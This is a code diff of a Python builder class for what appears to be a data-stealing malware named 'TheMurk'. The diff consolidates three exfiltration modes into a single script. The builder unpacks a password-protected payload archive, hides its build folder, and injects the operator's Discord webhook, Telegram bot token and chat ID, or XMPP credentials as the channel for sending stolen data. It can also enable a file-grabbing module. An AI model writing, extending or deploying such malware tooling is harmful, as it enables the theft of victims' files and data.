@@ -165,32 +165,24 @@ class Builder():
 
 
     def BuildXMPP(self, jabberid,jabberpassword,jabberreceiver,FG):
+        print("\033[33m{}\033[0m".format("\n\n(i) Building started"))
         with pyzipper.AESZipFile('Modules.zip', 'r', compression=pyzipper.ZIP_STORED,
                                  encryption=pyzipper.WZ_AES) as extracted_zip:
             extracted_zip.extractall(pwd=str.encode('pass'))
 
         win32api.SetFileAttributes('buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)
+        
+        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'r') as f:
+            data = f.read()
 
-        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendX.py', 'r') as f:
-            old_data = f.read()
-
-        new_data = old_data.replace('jabberid = \"\"', f'jabberid = \'{jabberid}\'')
-        new_data = new_data.replace('jabberpassword = \"\"', f'jabberpassword = \'{jabberpassword}\'')
-        new_data = new_data.replace('jabberreceiver = \"\"', f'jabberreceiver = \'{jabberreceiver}\'')
         if FG == "Y" or FG == "y":
-            with open ("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py", "r") as fg:
-                fg_data = fg.read()
-            fg_data = fg_data.replace('enableFileGrubber = False', 'enableFileGrubber = True')
+            data = data.replace('enableFileGrubber = False', 'enableFileGrubber = True')
+        
+        data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 2")
+        data = data.replace('xmppData = ["jabberid","jabberpassword","jabberreceiver"]',f'xmppData = ["{jabberid}","{jabberpassword}","{jabberreceiver}"]')
 
-            with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'w') as fg:
-                fg.write(fg_data)
-
-        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendX.py', 'w') as f:
-            f.write(new_data)
-
-        os.rename("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendX.py","buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/send.py")
-        os.remove("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendD.py")
-        os.remove("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendT.py")
+        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'w') as file:
+            file.write(data)
 
 
         fullPath = os.path.abspath('Modules.zip')
@@ -210,31 +202,24 @@ class Builder():
 
 
     def BuildDiscord(self,urlWebHook,name,FG):
+        print("\033[33m{}\033[0m".format("\n\n(i) Building started"))
         with pyzipper.AESZipFile('Modules.zip', 'r', compression=pyzipper.ZIP_STORED,
                                  encryption=pyzipper.WZ_AES) as extracted_zip:
             extracted_zip.extractall(pwd=str.encode('pass'))
 
         win32api.SetFileAttributes('buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)
 
-        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendD.py', 'r') as f:
-            old_data = f.read()
+        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'r') as f:
+            data = f.read()
 
-        new_data = old_data.replace('urlWebHook = \"\"', f'urlWebHook = \'{urlWebHook}\'')
-        new_data = new_data.replace('botName = \"\"', f'botName = \'{name}\'')
         if FG == "Y" or FG == "y":
-            with open ("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py", "r") as fg:
-                fg_data = fg.read()
-            fg_data = fg_data.replace('enableFileGrubber = False', 'enableFileGrubber = True')
-
-            with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'w') as fg:
-                fg.write(fg_data)
-
-        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendD.py', 'w') as f:
-            f.write(new_data)
+            data = data.replace('enableFileGrubber = False', 'enableFileGrubber = True')
         
-        os.rename("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendD.py","buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/send.py")
-        os.remove("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendT.py")
-        os.remove("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendX.py")
+        data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 0")
+        data = data.replace('discordData = ["url of your WebHook","name of that WebHook"]',f'discordData = ["{urlWebHook}","{name}"]')
+
+        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'w') as file:
+            file.write(data)
 
         fullPath = os.path.abspath('Modules.zip')
         fullPath = fullPath.replace('\\Modules.zip', '')
@@ -253,31 +238,24 @@ class Builder():
 
 
     def BuildTelegram(self,token,id,FG):
+        print("\033[33m{}\033[0m".format("\n\n(i) Building started"))
         with pyzipper.AESZipFile('Modules.zip', 'r', compression=pyzipper.ZIP_STORED,
                                  encryption=pyzipper.WZ_AES) as extracted_zip:
             extracted_zip.extractall(pwd=str.encode('pass'))
 
         win32api.SetFileAttributes('buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)
 
-        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendT.py', 'r') as f:
-            old_data = f.read()
+        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'r') as f:
+            data = f.read()
 
-        new_data = old_data.replace('Token = \"\"', f'Token = \'{token}\'')
-        new_data = new_data.replace('ID = \"\"', f'ID = \'{id}\'')
         if FG == "Y" or FG == "y":
-            with open ("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py", "r") as fg:
-                fg_data = fg.read()
-            fg_data = fg_data.replace('enableFileGrubber = False', 'enableFileGrubber = True')
+            data = data.replace('enableFileGrubber = False', 'enableFileGrubber = True')
+        
+        data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 1")
+        data = data.replace('TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]',f'TelegramData = ["{token}","{id}"]')
 
-            with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'w') as fg:
-                fg.write(fg_data)
-
-        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendT.py', 'w') as f:
-            f.write(new_data)
-
-        os.rename("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendT.py","buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/send.py")
-        os.remove("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendD.py")
-        os.remove("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendX.py")
+        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'w') as file:
+            file.write(data)
 
 
         fullPath = os.path.abspath('Modules.zip')
